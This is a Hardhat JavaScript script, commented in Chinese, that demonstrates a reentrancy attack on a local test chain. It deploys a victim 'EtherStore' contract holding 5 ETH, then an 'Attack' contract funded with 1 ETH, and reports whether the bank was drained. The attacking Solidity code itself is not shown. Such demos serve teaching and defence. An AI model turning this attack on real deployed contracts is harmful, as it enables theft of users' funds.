const hre = require("hardhat");

async function main() {
  console.log("🚨 启动重入攻击演示 🚨");
  const [deployer, attacker] = await hre.ethers.getSigners();

  // 1. 部署受害者合约 (EtherStore)
  const EtherStore = await hre.ethers.getContractFactory("EtherStore");
  const etherStore = await EtherStore.deploy();
  await etherStore.waitForDeployment();
  const storeAddr = await etherStore.getAddress();
  console.log("EtherStore (银行) 部署地址:", storeAddr);

  // 2. 存入资金 (让银行里有钱)
  console.log("银行初始存款: 5 ETH");
  await etherStore.deposit({ value: hre.ethers.parseEther("5") });
  
  // 3. 部署攻击者合约
  const Attack = await hre.ethers.getContractFactory("Attack");
  const attack = await Attack.connect(attacker).deploy(storeAddr);
  await attack.waitForDeployment();
  console.log("Attack (黑客) 部署地址:", await attack.getAddress());

  // 4. 发起攻击
  console.log("\n黑客发起攻击！投入 1 ETH...");
  const tx = await attack.connect(attacker).attack({ value: hre.ethers.parseEther("1") });
  await tx.wait();

  // 5. 检查结果
  const bankBalance = await hre.ethers.provider.getBalance(storeAddr);
  const hackerBalance = await hre.ethers.provider.getBalance(await attack.getAddress());
  
  console.log("\n--- 攻击结果 ---");
  console.log(`银行剩余余额: ${hre.ethers.formatEther(bankBalance)} ETH`);
  console.log(`黑客合约余额: ${hre.ethers.formatEther(hackerBalance)} ETH`);

  if (bankBalance == 0) {
    console.log("💀 攻击成功！银行被掏空了！");
  } else {
    console.log("🛡️ 攻击失败。");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
